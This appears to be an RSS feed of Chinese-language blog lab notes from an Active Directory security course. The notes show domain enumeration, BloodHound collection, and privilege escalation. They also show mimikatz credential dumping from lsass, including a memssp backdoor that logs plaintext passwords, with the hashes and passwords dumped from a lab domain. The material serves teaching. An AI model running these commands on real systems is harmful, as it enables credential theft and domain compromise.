$ Sekurlsa::minidump "&lt;path to lsass.dmp>" $ Sekurlsa::logonPasswords :::spoiler Result</description></item><item><title>NTUSTISC - AD Note - Lab(利用弱點)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/index.html</guid><description>NTUSTISC - AD Note - Lab(利用弱點) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background Internet Information Services(IIS) IIS是縮寫，全稱Internet Information Services ( IIS,互聯網信息服務 ),是由微軟公司提供的基於運行Microsoft Windows的互聯網基本服務。
IIS是指World Wide Web server服務，IIS是一種Web（網頁）服務組件，專業的說，IIS可以賦予一部主機電腦一組以上的IP地址，而且還可以有一個以上的域名作為Web網站。做過服務器配置的都應該知道IIS。制作好了網站怎麽才能讓別人瀏覽，就是通過網站服務器來實現的。IIS只是網站服務器的一種而已。
簡單來說： Internet Information Service（IIS）是windows開設web網頁服務的組件，用來搭載網站運行程序的平台的。還能提供FTP，SMTP等服務。
在UNIX或Linux平台上，Apache就是網站服務器。
而對於Windows NT/2000來說，IIS就是標準的網站服務器。
IIS是一種服務，是Windows 2000 Server系列的一個組件。不同於一般的應用程序，它就像驅動程序一樣是操作系統的一部分，具有在系統啟動時被同時啟動的服務功能。 如果想知道如何在win10啟用IIS或是建置網站server，可以看這個影片1
一般權限(就像前面的lab那樣) 取得網域使用者資訊 Scan Port Check Group Policy Object 高權限好處 Dump Password or Hash Turn off Defender Check the other users’ info 本地特出使用者 ==NT Authority\System==(本地端真正的最高權限使用者) NT Authority\Network Service NT Authority\Local Service NT Authority\IUSR 提權方法 利用弱點(通常是直接用Windows CVE直接打看看)，可參考2 Hijack Token Guess Password 就像前面環境觀察中提到的一樣，可以從Active Directory Users and Computers的description中看看有沒有密碼的提示，或是查看$ net user變更密碼的時間是哪時候，然後考慮爆破 Local Admin比Domain Admin好拿 通常是固定密碼 所有主機都相同 可能很多人知道 弱密碼 系統初始化包 Solution: 可以參考本機系統管理員密碼解決方案(LAPS) 管理服務 錯誤配置 Lab Time - 本地提權 ==利用弱點== $ git clone https://github.com/bitsadmin/wesng.git --depth 1 $ cd wesng $ python wes.py --update $ systeminfo.exe > systeminfo.txt # 這條指令是windows內建的指令，所以一定要在cmd中操作 $ python wes.py systeminfo.txt :::spoiler Result</description></item><item><title>NTUSTISC - AD Note - Lab(查詢本地使用者)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/index.html</guid><description>NTUSTISC - AD Note - Lab(查詢本地使用者) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==查詢本地使用者== 常用的cheat sheet
$ net user $ net user &lt;username> :::spoiler Implementation
$ net user \\DESKTOP-G95U93T 的使用者帳戶 ------------------------------------------------------------------------------- Administrator DefaultAccount Guest low user WDAGUtilityAccount 命令已經成功完成。 $ net user administrator 使用者名稱 Administrator 全名 註解 管理電腦/網域的內建帳戶 使用者的註解 國家/區域碼 000 (系統預設值) 帳戶使用中 Yes 帳戶到期 從不 上次設定密碼 ‎2021/‎9/‎28 下午 10:10:39 密碼到期 從不 可變更密碼 ‎2021/‎9/‎28 下午 10:10:39 請輸入密碼 Yes 使用者可以變更密碼 Yes 容許的工作站 全部 登入指令檔 使用者設定檔 主目錄 上次登入時間 ‎2023/‎8/‎26 上午 12:48:36 可容許的登入時數 全部 本機群組會員 *Administrators 全域群組會員 *None 命令已經成功完成。 :::</description></item><item><title>NTUSTISC - AD Note - Lab(查詢網域群組)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/index.html</guid><description>NTUSTISC - AD Note - Lab(查詢網域群組) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==查詢網域群組== 常用的cheat sheet Domain Admins, Schema Admins, Enterprise Admins是預設的權限，通常一進到AD網域都會先看這幾個權限有哪些成員
$ net groups /domain # 查詢網域中群組的資料 $ net groups "Domain Admins" /domain $ net groups "Schema Admins" /domain $ net groups "Enterprise Admins" /domain :::spoiler Implementation
$ net groups /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 \\WIN-818G5VCOLJO.kuma.org 的群組帳戶 ------------------------------------------------------------------------------- *accounting *Cloneable Domain Controllers *DnsUpdateProxy *Domain Admins *Domain Computers *Domain Controllers *Domain Guests *Domain Users *Enterprise Admins *Enterprise Key Admins *Enterprise Read-only Domain Controllers *Executives *Group Policy Creator Owners *IT Admins *Key Admins *marketing *Office Admin *Project management *Protected Users *Read-only Domain Controllers *sales *Schema Admins *Senior management 命令已經成功完成。 $ net groups "Domain Admins" /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 群組名稱 Domain Admins 註解 Designated administrators of the domain 成員 ------------------------------------------------------------------------------- Administrator 命令已經成功完成。 $ net groups "Schema Admins" /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 群組名稱 Schema Admins 註解 Designated administrators of the schema 成員 ------------------------------------------------------------------------------- Administrator 命令已經成功完成。 $ net groups "Enterprise Admins" /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 群組名稱 Enterprise Admins 註解 Designated administrators of the enterprise 成員 ------------------------------------------------------------------------------- Administrator 命令已經成功完成。 可以看到目前這三個預設的群組，都只有Administrator在裡面而已 :::</description></item><item><title>NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/index.html</guid><description>NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 如果遇到不能重開機的狀況，要怎麼前面提到的明文密碼呢?可以利用MEMSSP，它也是mimikatz設計的一個小後門，只要提升debug權限，再注入這個後門，之後等其他人登入到此主機，就可以被這個後門記錄起來
Lab ==無法Reboot的時盜取Passwd== Inject memssp 記得用系統管理員權限開mimikatz mimikatz # privilege::debug Privilege '20' OK mimikatz # misc::memssp Injected =) Relogin 重新登出再登入才會看到 Result 在C:\Windows\System32\mimilsa.log [00000000:001f7c0f] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f7c0f] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f80d1] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f80d1] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f80e8] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f80e8] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc [00000000:001fc85a] kuma\bear	1qaz@WSX3edc [00000000:001fc85a] kuma\bear	1qaz@WSX3edc [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc 可以看到這個log file用明文的方式新增了我們剛剛打入的密碼 ==How to detect it?== 一樣是用Sysmon的Event ID: 11可以知道，但因為之前安裝不成功所以只能Skip，不過原理就是他是去偵測lsass.exe建立mimilsa.log的瞬間</description></item><item><title>NTUSTISC - AD Note - Lab(環境調查BloodHound)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/index.html</guid><description>NTUSTISC - AD Note - Lab(環境調查BloodHound) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background [Windows Programming] IPC 通知機制與安全設定
當系統中需要同步處理某些資源的存取權時，可以使用 Windows 的同步處理物件協調不同 process 間對於共同資源的互動，Windows 提供的同步處理物件有四種，分別是: Event, Mutex, Semaphore, Waitable timer，本篇只會提到 Event 喔！
假設系統中有兩個 process：process A 得等待 process B 完成某些特定工作後才能繼續執行。windows 提供的 event 機制能讓 process B 完成工作後發出訊號通知 process A，而 process A 則進入等待狀態直到接受到訊號後才繼續執行後續工作。Process 間只需定好溝通的 event name 就可以輕鬆達成跨程序間的通訊 (Inter-process communication : IPC)，正因為簡單好實現的特性，event 常被用在程序間的溝通與同步。
Lab Time - 環境調查 BloodHound AD 說明: 環境調查的視覺化工具 版本: 4.0.3 :::info 8/29更新：經過實測還是建議使用4.1.0，詳細原因可以參考1，原作者說明這是一個bug，已在4.1.0做了修正，所以還是以4.1.0為主，雖然聽講師說可能會少東西，不過對我們小專案來說應該沒差 ::: Link: BloodHound GitHub 必要條件: 必須裝設Neo4j Server / Graph Database, 而且必須要是community version，link Download Collector BloodHound是一個環境調查的視覺化工具，所以要先在我們的環境先蒐集一些環境上的資訊，再導入到BloodHound中進行分析，因此我們應該先下載能夠蒐集環境資訊的Collector我是直接把整包clone下來，然後用隨身碟傳到VM(因為那時候Win10已經加入AD，我懶得改回來上網) :::info Note: Windows的defender會擋BloodHound-master/Collectors/SharpHound.exe和SharpHound.ps1這兩個files，所以記得關掉defender ::: Use the Collector First :::info Note: 記得要用bear的網域帳號登入，SharpHound.exe才找的到LDAP ::: CMD直接進入C:\tools\BloodHound-master\Collectors，然後直接執行$ SharpHound.exe :::spoiler Implementation $ SharpHound.exe 2023-08-29T11:02:31.4846421+08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound 2023-08-29T11:02:31.6707467+08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-08-29T11:02:31.6985917+08:00|INFORMATION|Initializing SharpHound at 上午 11:02 on 2023/8/29 2023-08-29T11:02:31.9891653+08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for kuma.org : WIN-818G5VCOLJO.kuma.org 2023-08-29T11:02:32.3820391+08:00|INFORMATION|Loaded cache with stats: 163 ID to type mappings. 163 name to SID mappings. 1 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings. 2023-08-29T11:02:32.3915435+08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-08-29T11:02:32.6206999+08:00|INFORMATION|Beginning LDAP search for kuma.org 2023-08-29T11:02:32.8062803+08:00|INFORMATION|Producer has finished, closing LDAP channel 2023-08-29T11:02:32.8230625+08:00|INFORMATION|LDAP channel closed, waiting for consumers 2023-08-29T11:03:03.3930708+08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 42 MB RAM 2023-08-29T11:03:13.1743544+08:00|INFORMATION|Consumers finished, closing output channel Closing writers 2023-08-29T11:03:13.2209345+08:00|INFORMATION|Output channel closed, waiting for output task to complete 2023-08-29T11:03:13.3058132+08:00|INFORMATION|Status: 204 objects finished (+204 5.1)/s -- Using 44 MB RAM 2023-08-29T11:03:13.3058132+08:00|INFORMATION|Enumeration finished in 00:00:40.6864986 2023-08-29T11:03:13.3918361+08:00|INFORMATION|Saving cache with stats: 163 ID to type mappings. 163 name to SID mappings. 1 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings. 2023-08-29T11:03:13.4075189+08:00|INFORMATION|SharpHound Enumeration Completed at 上午 11:03 on 2023/8/29! Happy Graphing! ::: 理論上成功的話，會在該folder中出現一個.zip file with name &lt;TimeStamp>.BloodHound.zip此時按照之前啟動BloodHound的方法啟動BloodHound，然後把zip folder拖進去就可以了 ==如何偵測AD== 有兩種方法，也可以同時使用</description></item><item><title>NTUSTISC - AD Note - Lab(當前網域控制站(DC))</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/index.html</guid><description>NTUSTISC - AD Note - Lab(當前網域控制站(DC)) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 情報蒐集：==當前網域控制站(DC)== 以駭客的角度來說，如果已經連到AD中，要怎麼知道目前DC是誰 常用的cheat sheet
$ echo %logonserver% $ nltest /dclist:&lt;domain> :::spoiler Implementation
$ echo %logonserver% \\WIN-818G5VCOLJO $ nltest /dclist:kuma.org 取得網域 'kuma.org' (從 '\\WIN-818G5VCOLJO.kuma.org') 中的 DC 清單。 WIN-818G5VCOLJO.kuma.org [PDC] [DS] 站台: Default-First-Site-Name 命令成功完成 從Win10當中下指令的確可以知道Win2016的PC Name是WIN-818G5VCOLJO :::</description></item><item><title>NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/index.html</guid><description>NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 得到更高權限之後，會想要更多的密碼
密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) GPO Where: \\&lt;domain>\SysVol\&lt;domain>\Policie，以本次實驗為例，就是放在\\kuma.org\SYSVOL\kuma.org\Policies，接下來就是隨機生成的&lt;UID>\Users\Scripts和&lt;UID>\Machine\Scripts，這兩個腳本是我們覺得重要的 記憶體(lsass) 為了獲取更多其他帳號密碼，嘗試逼近Domain Admin，可以使用Mimikatz獲取暫存憑證 ==What is Mimikatz?== Mimikatz為一個強力的Windows提權工具，可以提升Process權限、注入Process讀取Process記憶體，可以直接從lsass中獲取當前登錄過系統用戶的帳號明文密碼。 lsass是微軟Windows系統的安全機制它主要用於本地安全和登陸策略，通常我們在登陸系統時輸入密碼之後，密碼便會儲存在lsass內存中，經過其wdigest和tspkg兩個模塊調用後，對其使用可逆的算法進行加密並存儲在內存之中，而mimikatz正是通過對lsass的逆算獲取到明文密碼。 簡單說就是所有登入認證都交給lsass，所以他有所有人的認證憑證
Download: Mimikatz-github How to use: Mimikatz最新版本一共三個文件(mimilib.dll、mimikatz.exe、mimidrv.sys)，分為Win32位(多了一個mimilove.exe文件)和X64位 下載後解壓縮即可使用，裡面分為Win32和X64，Win32是針對Windows32位，而X64是針對64位作業系統，目前絕大部分作業系統為64位 ==lsass.exe VS SAM== SAM只會存取本地用戶的NTLM Hash，而lsass.exe是只要有存取過目前電腦的使用者都會被記錄，例如domain admin或是其他使用者利用smb連過來也會被lsass紀錄 Lab ==透過Mimikatz取得Local Admin的NTLM== Activate Mimikatz 進入C:\tools\mimikatz_trunk\x64右鍵以系統管理員身分執行mimikatz.exe(一定要用系統管理員才能執行提權的debug) 起手式 mimikatz # Privilege::Debug Privilege '20' OK mimikatz # log Using 'mimikatz.log' for logfile : OK mimikatz # Sekurlsa::logonPasswords :::spoiler Log Reuslt Using 'mimikatz.log' for logfile : OK mimikatz # Sekurlsa::logonPasswords Authentication Id : 0 ; 23133312 (00000000:0160fc80) Session : CachedInteractive from 1 User Name : Administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/4 06:07:18 SID : S-1-5-21-306106713-2531972042-334329499-500 msv :	[00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg :	wdigest :	* Username : Administrator * Domain : kuma * Password : (null) kerberos :	* Username : Administrator * Domain : KUMA.ORG * Password : 1qaz@WSX3edc ssp :	credman :	cloudap :	Authentication Id : 0 ; 20047794 (00000000:0131e7b2) Session : CachedInteractive from 1 User Name : Administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/4 10:19:22 SID : S-1-5-21-306106713-2531972042-334329499-500 msv :	[00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg :	wdigest :	* Username : Administrator * Domain : kuma * Password : (null) kerberos :	* Username : Administrator * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 16441076 (00000000:00fadef4) Session : Interactive from 1 User Name : administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/4 12:44:48 SID : S-1-5-21-306106713-2531972042-334329499-500 msv :	[00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg :	wdigest :	* Username : Administrator * Domain : kuma * Password : (null) kerberos :	* Username : administrator * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 14849757 (00000000:00e296dd) Session : Service from 0 User Name : DefaultAppPool Domain : IIS APPPOOL Logon Server : (null) Logon Time : 2023/9/3 09:44:12 SID : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 1299130 (00000000:0013d2ba) Session : Interactive from 1 User Name : bear Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/8/29 12:47:58 SID : S-1-5-21-306106713-2531972042-334329499-2101 msv :	[00000003] Primary * Username : bear * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : 4057a0d0b94378dd03224e8b3d28a006 tspkg :	wdigest :	* Username : bear * Domain : kuma * Password : (null) kerberos :	* Username : bear * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 995 (00000000:000003e3) Session : Service from 0 User Name : IUSR Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2023/8/29 12:40:42 SID : S-1-5-17 msv :	tspkg :	wdigest :	* Username : (null) * Domain : (null) * Password : (null) kerberos :	ssp :	credman :	cloudap :	Authentication Id : 0 ; 997 (00000000:000003e5) Session : Service from 0 User Name : LOCAL SERVICE Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2023/8/29 12:40:39 SID : S-1-5-19 msv :	tspkg :	wdigest :	* Username : (null) * Domain : (null) * Password : (null) kerberos :	* Username : (null) * Domain : (null) * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 70138 (00000000:000111fa) Session : Interactive from 1 User Name : DWM-1 Domain : Window Manager Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-90-0-1 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 70109 (00000000:000111dd) Session : Interactive from 1 User Name : DWM-1 Domain : Window Manager Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-90-0-1 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 996 (00000000:000003e4) Session : Service from 0 User Name : DESKTOP-G95U93T$ Domain : kuma Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-20 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : desktop-g95u93t$ * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 47346 (00000000:0000b8f2) Session : Interactive from 1 User Name : UMFD-1 Domain : Font Driver Host Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-96-0-1 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 46297 (00000000:0000b4d9) Session : Interactive from 0 User Name : UMFD-0 Domain : Font Driver Host Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-96-0-0 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 44132 (00000000:0000ac64) Session : UndefinedLogonType from 0 User Name : (null) Domain : (null) Logon Server : (null) Logon Time : 2023/8/29 12:40:37 SID : msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	kerberos :	ssp :	credman :	cloudap :	Authentication Id : 0 ; 999 (00000000:000003e7) Session : UndefinedLogonType from 0 User Name : DESKTOP-G95U93T$ Domain : kuma Logon Server : (null) Logon Time : 2023/8/29 12:40:37 SID : S-1-5-18 msv :	tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : desktop-g95u93t$ * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	::: 可以看到這一份檔案比前面提到的SAM還要完整很多，用log的原因是他會把輸出dump下來，用熟悉的文字編輯器尋找有用的資訊比較方便，另外，==Privilege::Debug==的意思是跟windows取得debug lsass的權限</description></item><item><title>NTUSTISC - AD Note - Lab(遠端執行(RDP))</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/index.html</guid><description>NTUSTISC - AD Note - Lab(遠端執行(RDP)) [TOC]
Lecture Video: 2022/05/11 AD 安全 2 Background What is EULA?
